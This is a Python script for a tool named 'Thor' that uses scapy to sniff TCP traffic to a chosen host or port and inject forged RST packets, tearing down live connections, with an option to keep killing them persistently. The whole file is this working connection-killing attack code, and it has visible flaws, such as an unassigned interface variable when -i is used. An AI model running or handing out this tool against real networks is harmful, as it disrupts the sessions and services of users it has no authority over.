import logging
# gets rid of scapy IPv6 error on import
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from termcolor import colored
from multiprocessing import Process, Queue, Lock
import time
import datetime
import argparse

class PicklablePacket:
    """A container for scapy packets that can be pickled (in contrast
    to scapy packets themselves)."""
    def __init__(self, pkt):
        self.contents = bytes(pkt)
        self.time = pkt.time

    def __call__(self):
        """Get the original scapy packet."""
        pkt = Ether(self.contents)
        pkt.time = self.time
        return pkt

class Kill(Process):
    def __init__(self, que, lock, iface, persist):
        super(Kill, self).__init__()
        self.que = que
        self.quelen = 0
        self.lock = lock
        self.persist = persist
        self.que_wait_timeout = 0
        self.look_for = False
        self.iface = iface
        self.ready_packet = None

    def run(self):
        self.que_control(self.lock)

    def add(self, pkt):
        logger.debug(('Packet Recieved: {} ----> {}').format(pkt[IP].src, pkt[IP].dst))
        self.que.put(PicklablePacket(pkt))


    def kill(self, pkt):

        logger = logging.getLogger(__name__)
        pkt_tuple = (pkt[IP].dst, pkt[TCP].dport, pkt[TCP].flags)
        us_check = (pkt[IP].src, pkt[TCP].sport, pkt[TCP].flags)

        # Were we waiting for it and Incoming is not what we sent
        if self.look_for == pkt_tuple:
                print('Connection Dead: Acknowledgment reset seen')
                if not self.persist:
                    # todo Exit here
                    print('Bye')

        # did we send this packet ?
        elif self.look_for == us_check:
            pass

        else:
            # Setup the values
            self.flip(pkt)

            # send fin/rst with new checksum
            srp1(self.ready_packet, iface=self.iface, timeout =1, verbose=False)

    def flip(self, pkt):

        # Universal packet info
        self.ready_packet = copy.copy(pkt)

        # del IP checksum
        del self.ready_packet.chksum

        # del TCP checksum
        del self.ready_packet[TCP].chksum

        # Delete the ack flag
        del self.ready_packet[TCP].ack

        # Increment ID
        self.ready_packet[IP].id += 1

        # set the reset flag
        self.ready_packet[TCP].flags = 0x0004

        # Set the packet reply we are looking for
        self.look_for = (pkt[IP].src, pkt[TCP].sport, 0x0004)


    def que_control(self, lock):
        while True:
            # get que length
            self.quelen = self.que.qsize()

            # wait so we don't respond to every single packet
            time.sleep(0.2)

            # check the saved que length vs current que length and
            # every 2 seconds to see if the stream is very fast
            # 10 * 0.2 = 2 seconds

            if self.quelen < self.que.qsize() and self.que_wait_timeout < 10:
                self.que_wait_timeout +=1


            # things in que, but same size or timeout reached
            elif not self.que.empty():
                #print('Connection que size is currently: ' + str(self.que.qsize()))

                # Acquire lock to stop more packets adding, including what we send
                self.lock.acquire()

                # # fast stream
                if self.que_wait_timeout >= 10:
                    logger.debug('Timeout Exceeded')
                #     # some kill function that gets the average seq
                #     pass

                # Get the last item
                usable_pkt = None
                while not self.que.empty():

                    # get and unpickle packet
                    usable_pkt = self.que.get()()

                # go get it
                self.kill(usable_pkt)
                self.lock.release()

def get_iface():
    for num, i in enumerate(scapy.all.ifaces):
        print('[' + str(num) + ']', i)
    iface_num = int(input('Please select an interface: '))
    for num, i in enumerate(scapy.all.ifaces):
        if num == iface_num:
            iface = i
    logger.debug(('Interface set: {}').format(iface))
    return iface



def gen_filter(args):
    if args.targetip and args.targetport:
        filter = ' '.join(('ip host', args.targetip, 'and tcp port', str(args.targetport)))
    elif args.targetip:
        filter = ' '.join(('ip host', args.targetip))
    elif args.targetport:
        filter = ' '.join(('tcp port', str(args.targetport)))
    else:
        sys.exit('Need IP or Port to proceed.')
    logger.debug(('Filter set: {}').format(filter))
    return filter


def parse():
    parser = argparse.ArgumentParser(description='Thor: Killing conns since 2016')
    parser.add_argument('-i', dest='iface', type=str, required=False, metavar='Eth0',
                        help='The interface to use')
    parser.add_argument('-p', dest='persist', type=str, required=False,
                        help='Persistently kill connections')
    parser.add_argument('-t', dest='targetip', type=str, required=False, metavar='192.168.1.1',
                        help='The target server.')
    parser.add_argument('-s', dest='targetport', type=int, required=False, metavar=22,
                        help='The target port.')
    parser.add_argument('-v', dest='verbosity', type=str, required=False, metavar='v, vv', default='v',
                        choices=['v', 'vv'], help='The verbosity level')

    return parser.parse_args()


if __name__ == "__main__":
    logging.basicConfig(format='%(levelname)s : %(asctime)s - %(message)s')
    logging.basicConfig(datefmt='%I:%M%S')
    logging.basicConfig(level=logging.DEBUG)
    logger = logging.getLogger(__name__)

    # Get cmd options
    args = parse()

    # Setup Verbosity
    if args.verbosity == 'v':
        logger.setLevel(logging.INFO)

    elif args.verbosity == 'vv':
        logger.setLevel(logging.DEBUG)

    # Persist?
    if args.persist:
        persist = True
    else:
        persist = False

    # Select iface if not set
    if not args.iface:
        iface = get_iface()

    # Create filter from args
    filter = gen_filter(args)

    # Initialise the que
    que = Queue()

    # Initialise the lock
    lock = Lock()

    # Add que, lock and iface to the threaded class instance
    killer = Kill(que, lock, iface, persist)
    killer.daemon = True

    # Start the instance
    killer.start()

    # Check for traffic and add to que
    sniff(filter=filter, prn = killer.add, iface=iface)

